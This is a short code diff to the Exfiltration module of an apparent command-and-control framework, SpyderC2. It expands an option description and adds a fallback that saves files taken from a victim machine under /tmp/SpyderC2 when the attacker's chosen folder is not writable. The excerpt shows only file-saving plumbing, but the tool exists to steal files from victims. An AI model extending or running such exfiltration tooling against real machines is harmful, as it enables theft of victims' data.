@@ -14,7 +14,7 @@ class Exfiltration(Module):
 	@classmethod
 	def module_options(cls):
 		h = {
-			'path' : {'desc' : 'Directory on the attacker machine where the files are downloaded. Default is shared/victim_data/<victim_id>', 'required' : False},
+			'path' : {'desc' : 'Directory on the attacker machine where the files are downloaded. Default is shared/victim_data/<victim_id>. NOTE : The default path can be accessed in both docker and host, accessibility of custom path will depend on where you run the program.', 'required' : False},
 			'location' : {'desc': 'Path of directory or file on victim to exfiltrate.','required': True}
 		}
 		return h
@@ -42,6 +42,14 @@ class Exfiltration(Module):
 			else:
 				filepath = os.path.join(options['path'],filename)
 
+
+		## Check if we have write perms else save to /tmp/SpyderC2
+		if not os.access(os.path.dirname(filepath), os.W_OK):
+			dump_path = os.path.join('/tmp','SpyderC2',victim_id)
+			print(f"No write access to {os.path.dirname(filepath)}. Saving to {dump_path}")
+			if not os.path.exists(dump_path):
+				os.makedirs(dump_path,exist_ok=True)
+			filepath = os.path.join(dump_path,filename)
 
 		## Dump the zip file
 		with open(filepath, "wb") as f:
